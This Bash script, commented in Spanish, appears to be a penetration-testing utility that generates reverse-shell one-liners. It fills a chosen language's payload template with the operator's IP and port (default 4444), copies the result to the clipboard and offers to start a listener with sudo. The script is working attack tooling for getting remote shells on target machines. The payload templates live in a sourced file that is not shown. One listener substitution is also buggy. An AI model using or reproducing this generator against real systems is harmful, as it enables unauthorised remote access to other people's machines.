#!/usr/bin/env bash

#
#
#	OneLiner Reverse Shell
#
#					ODBK   |   odbksec@protonmail.com
#

source network
source plantillas
source oneliner

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){
	error "Forzando salida"
	exit 0
}

function ayuda(){
	# Cargo los oneliners
	informacion "${azul}-i${finColor} Interfaz de la cual se obtendrá la IP"
    informacion "${azul}-l${finColor} IP Local (opcional)"
    informacion "${azul}-p${finColor} Puerto a la escucha. Defecto: 4444"
    informacion "${azul}-s${finColor} Script a usar para generar la shell. Disponibles:"
	informacion "\t${amarillo}${langs}${finColor}"
    informacion "${azul}-h${finColor} Muestra esta ayuda"
    echo -e "\n"
	exit 0
}


#	MAIN
	banner "${verde}Reverse Shell Oneliner Generator${finColor}"
	shells=`cut -d'=' -f1 oneliner | awk '{print $3}'`
	langs=`echo $shells`

	while getopts ":i:l:p:s:h" arg; do
		case $arg in
			i) iface=$OPTARG;;
			p) port=$OPTARG;;
			s) lang=$OPTARG;;
			l) lhost=$OPTARG;;
			h) ayuda;;
		esac
	done


	# Checamos el puerto
	if  [ $(checkPort $port) -eq 1 ] ; then
        informacion "${verde}Puerto Local: ${finColor}"$port
    else
    	port=4444
        informacion "${verde}Puerto Local (defecto): ${finColor}"$port
    fi


    # Si ha introducido lhost ignoramos extraerlo de las interfaces
    if [[ $lhost ]]; then
    	if [[ $(checkIP $lhost ) -eq 1 ]] ; then
    		ip=$lhost
        	informacion "${verde}IP local: ${finColor}"$lhost
        else
        	error "IP No válida, revísela por favor"
        	exit 0
        fi
    else
    	ip=$(echo $(getIP $iface))
    	if [[ $(checkIP $ip) -eq 1 ]] ; then
			informacion "${verde}IP Local: ${finColor}"$ip
		else
			error "Interfaz erronea .... Saliendo"
			exit 0
		fi
	fi
	
	# Checamos lenguaje
	if [[ "${shells[@]}" =~ "${lang}" ]]; then
		line=$( eval echo \${${lang}["payload"]} )
		informacion "${verde}Payload: ${finColor}"$line
      	oneliner=${line/"##ip##"/$ip}
       	oneliner=${oneliner/"##port##"/$port}
        echo $oneliner | xclip -sel clip
        resultado "${amarillo}Resultado\n ${finColor}"$oneliner
        informacion "${turquesa}En su clipboard si tiene instalado XCLIP"$finColor
    else
        error "Lenguaje no disponible .... Saliendo"
        exit 0
    fi

    consulta "¿Desea que iniciemos la escucha? (s/n)"
    read respuesta

    if [[ $respuesta == "s" || $respuesta == "S" ]] ; then
    	listen=$( eval echo \${${lang}["listen"]} )
    	myListen=${listen/"##ip##"/$ip}
    	myListen=${listen/"##port##"/$port}
    	informacion "Ejecutando: ${myListen}"
    	sudo $myListen
    else
    	informacion "Saludos by ODBK"
    fi
